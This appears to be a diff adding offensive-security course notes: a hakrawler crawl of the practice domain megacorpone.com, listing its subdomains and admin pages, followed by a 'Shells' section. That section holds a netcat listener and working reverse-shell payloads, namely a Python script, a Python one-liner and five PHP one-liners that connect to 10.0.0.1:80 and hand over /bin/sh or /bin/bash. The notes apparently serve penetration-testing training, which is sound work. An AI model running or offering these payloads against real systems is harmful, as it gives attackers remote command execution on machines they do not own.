@@ -1,0 +1,89 @@
+Hakrawler
+Listing 33 - Updating Apt.
+
+
+kali@kali:~$ sudo apt-get install -y hakrawler
+. . . 
+The following NEW packages will be installed:
+  hakrawler
+0 upgraded, 1 newly installed, 0 to remove and 1447 not upgraded.
+Need to get 2,697 kB of archives.
+After this operation, 8,901 kB of additional disk space will be used.
+. . . 
+
+kali@kali:~$ which hakrawler
+/usr/bin/hakrawler
+
+kali@kali:~$ hakrawler --help
+Usage of hakrawler:
+  -d int
+    	Depth to crawl. (default 2)
+  -insecure
+    	Disable TLS verification.
+  -t int
+    	Number of threads to utilise. (default 8)
+
+
+kali@kali:~$ echo "https://www.megacorpone.com/" > urls.txt
+
+kali@kali:~$ cat urls.txt |./hakrawler
+https://www.megacorpone.com/index.html
+https://www.megacorpone.com/index.html
+https://www.megacorpone.com/about.html
+https://www.megacorpone.com/contact.html
+http://support.megacorpone.com
+http://www.megacorpone.com/jobs.html
+http://intranet.megacorpone.com
+https://www.megacorpone.com/about.html
+https://www.megacorpone.com/about.html
+https://www.megacorpone.com/about.html
+http://admin.megacorpone.com/admin/index.html
+http://intranet.megacorpone.com/pear/
+http://mail.megacorpone.com/menu/
+http://mail2.megacorpone.com/smtp/relay/
+http://siem.megacorpone.com/home/
+http://support.megacorpone.com/ticket/requests/index.html
+http://syslog.megacorpone.com/logs/sys/view.php
+https://www.megacorpone.com/about.html
+http://test.megacorpone.com/demo/index.php
+http://vpn.megacorpone.com/diffie-hellman/
+http://www.megacorpone.com/aboutus.html
+http://www.megacorpone.com/aboutus.html
+http://www.megacorpone.com/aboutus.html
+http://www2.megacorpone.com/test/newsite/index.php
+http://www2.megacorpone.com/test/newsite/index.php
+http://www2.megacorpone.com/test/newsite/index.php
+http://admin.megacorpone.com/news/today.php
+...
+
+=======================================================================
+Shells
+
+kali@kali:~$ nc -lvp 80            
+listening on [any] 80 ...
+
+Listing 38 - Taking Apart a Python Reverse Shell Payload
+
+
+import socket
+import subprocess
+import os
+import pty;
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0)
+
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+pty.spawn("/bin/bash")
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+php -r '$sock=fsockopen("10.0.0.1",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+
